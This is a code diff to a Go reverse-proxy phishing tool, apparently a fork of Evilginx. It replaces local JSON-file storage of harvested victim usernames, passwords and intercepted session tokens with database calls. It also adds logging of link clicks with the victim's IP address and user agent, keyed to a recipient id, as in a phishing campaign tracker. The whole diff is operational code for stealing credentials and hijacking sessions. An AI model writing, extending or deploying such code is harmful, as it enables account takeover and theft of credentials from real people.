@@ -21,7 +21,6 @@ import (
     "net/http"
     "net/url"
     "os"
-    "os/user"
     "path/filepath"
     "regexp"
     "sort"
@@ -29,7 +28,6 @@ import (
     "strings"
     "sync"
     "time"
-    "encoding/json"
 
     "golang.org/x/net/proxy"
 
@@ -183,6 +181,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             rid_match := ridr.FindString(req_url)
             if len(rid_match) != 0 {
                 rid = strings.Split(rid_match, "=")[1]
+				browser := map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
+				err := database.HandleClickedLink(rid, browser)
+				if err != nil {
+					log.Error("failed to add clicked link event to database: %s", err)
+				}
             }
         
             //log.Debug("http: %s", req_url)
@@ -468,24 +471,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
                                         log.Error("database: %v", err)
                                     }
-                                    usr, _ := user.Current()
-                                    creds := Creds{}
                                     session := p.sessions[ps.SessionId]
-                                    creds.Username = session.Username
-                                    creds.Password = session.Password
-                                    creds.RId = session.RId
-                                    creds.SubmitTime = time.Now()
-
-                                    credsfile, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "creds.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
-                                    if err != nil {
-                                        log.Error("credsfile: %s", err)
-                                    }
-                                    data, err := json.Marshal(creds)
-                                    if err != nil {
-                                        fmt.Println(err)
-                                    }
-                                    credsfile.Write(data)
-                                    credsfile.Write([]byte("\n"))
+									err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+									if err != nil {
+										fmt.Printf("Error submitting data to database: %s\n", err)
+									}
                                 }
                             }
 
@@ -533,24 +523,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
                                                 log.Error("database: %v", err)
                                             }
-                                            usr, _ := user.Current()
-                                            creds := Creds{}
                                             session := p.sessions[ps.SessionId]
-                                            creds.Username = session.Username
-                                            creds.Password = session.Password
-                                            creds.RId = session.RId
-                                            creds.SubmitTime = time.Now()											
-
-                                            credsfile, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "creds.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
-                                            if err != nil {
-                                                log.Error("credsfile: %s", err)
-                                            }
-                                            data, err := json.Marshal(creds)
-                                            if err != nil {
-                                                fmt.Println(err)
-                                            }
-                                            credsfile.Write(data)
-                                            credsfile.Write([]byte("\n"))
+											err = database.HandleSubmittedData(session.RId, session.Username, session.Password)
+											if err != nil {
+												fmt.Printf("Error submitting data to database: %s\n", err)
+											}
                                         }
                                     }
                                     for _, cp := range pl.custom {
@@ -763,18 +740,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 // we have all auth tokens
                 if s, ok := p.sessions[ps.SessionId]; ok {
                     log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-                    captured_session := CapturedSession{}
-                    captured_session.RId = s.RId
-                    captured_session.Tokens = s.Tokens
-                    data, _ := json.Marshal(captured_session)
-                    usr, _ := user.Current()
-                    sessions_file, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "sessions.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
-                    if err != nil {
-                        log.Error("sessions_file: %s", err)
-                    }
-                    sessions_file.Write(data)
-                    sessions_file.Write([]byte("\n"))
-                    //fmt.Printf("[*] Printing tokens test: %s\n", string(data))
+					err = database.HandleCapturedSession(s.RId, s.Tokens)
+					if err != nil {
+						fmt.Printf("Error adding captured session entry to database: %s\n", err)
+					}
                 }
             }
 
@@ -901,18 +870,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             }
                             if err == nil {
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-                                captured_session := CapturedSession{}
-                                captured_session.RId = s.RId
-                                captured_session.Tokens = s.Tokens
-                                data, _ := json.Marshal(captured_session)
-                                usr, _ := user.Current()
-                                sessions_file, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "sessions.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
-                                if err != nil {
-                                    log.Error("sessions_file: %s", err)
-                                }
-                                sessions_file.Write(data)
-                                sessions_file.Write([]byte("\n"))
-                                //fmt.Printf("[*] Printing tokens test: %s\n", string(data))
+                                err = database.HandleCapturedSession(s.RId, s.Tokens)
+								if err != nil {
+									fmt.Printf("Error adding captured session entry to database: %s\n", err)
+								}
                             }
                             break
                         }
